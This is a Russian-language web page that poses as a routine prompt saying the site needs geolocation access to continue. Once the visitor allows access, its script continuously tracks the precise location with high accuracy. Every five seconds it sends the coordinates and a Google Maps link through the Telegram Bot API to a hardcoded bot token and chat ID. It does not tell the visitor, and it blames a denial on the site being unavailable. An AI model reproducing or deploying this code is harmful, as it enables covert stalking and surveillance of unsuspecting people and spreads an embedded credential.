<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Access</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      height: 100vh;
      background: linear-gradient(135deg, #07121f, #0a2942, #103a5c);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      overflow: hidden;
    }

    .card {
      width: 90%;
      max-width: 400px; :
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.15);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 30px;
      text-align: center;
      box-shadow: 0 0 40px rgba(0,0,0,0.4);
    }

    .logo {
      width: 90px;
      height: 90px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: rgba(0,191,255,0.15);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 40px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 15px;
    }

    p {
      color: #c8d8e8;
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 14px;
      background: #00bfff;
      color: white;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s;
      font-weight: bold;
    }

    button:hover {
      background: #0099cc;
    }

    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #9ddcff;
    }

    .error {
      color: #ff7b7b;
    }

    .success {
      color: #72ffb0;
    }

    .loader {
      width: 45px;
      height: 45px;
      border: 4px solid rgba(255,255,255,0.1);
      border-top: 4px solid #00bfff;
      border-radius: 50%;
      margin: 0 auto 20px;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      100% {
        transform: rotate(360deg);
      }
    }

    .coords {
      margin-top: 15px;
      font-size: 13px;
      color: #cfefff;
      line-height: 1.6;
      word-break: break-word;
    }
  </style>
</head>

<body>

  <div class="card">
    <div class="loader" id="loader"></div>

    <div class="logo">
      📍
    </div>

    <h1>Доступ к геолокации</h1>

    <p>
      Для продолжения работы сайта необходимо разрешить доступ к геолокации.
    </p>

    <button id="allowBtn">
      Разрешить геолокацию
    </button>

    <div class="status" id="status">
      Ожидание разрешения...
    </div>

    <div class="coords" id="coords"></div>
  </div>

  <script>
    const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
    const CHAT_ID = "8424328584";

    const button = document.getElementById("allowBtn");
    const statusText = document.getElementById("status");
    const coordsText = document.getElementById("coords");
    const loader = document.getElementById("loader");

    let lastSent = 0;

    async function sendToTelegram(message) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
      } catch (error) {
        console.log(error);
      }
    }

    function startTracking() {
      if (!navigator.geolocation) {
        statusText.innerHTML = "Геолокация не поддерживается";
        statusText.className = "status error";
        return;
      }

      loader.style.display = "block";

      navigator.geolocation.watchPosition(
        async (position) => {
          const now = Date.now();

          if (now - lastSent < 5000) {
            return;
          }

          lastSent = now;

          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          loader.style.display = "none";

          statusText.innerHTML = "Геолокация активна";
          statusText.className = "status success";

          coordsText.innerHTML = `
            Latitude: ${lat}<br>
            Longitude: ${lon}<br>
            Accuracy: ${Math.round(accuracy)}m
          `;

          const message = `
📍 New Location

Latitude: ${lat}
Longitude: ${lon}
Accuracy: ${Math.round(accuracy)}m

Google Maps:
https://maps.google.com/?q=${lat},${lon}
          `;

          await sendToTelegram(message);
        },

        (error) => {
          loader.style.display = "none";

          statusText.innerHTML =
            "Сайт недоступен. Разрешите доступ к геолокации.";
          statusText.className = "status error";

          console.log(error);
        },

        {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 10000
        }
      );
    }

    button.addEventListener("click", () => {
      startTracking();
    });
  </script>

</body>
</html>
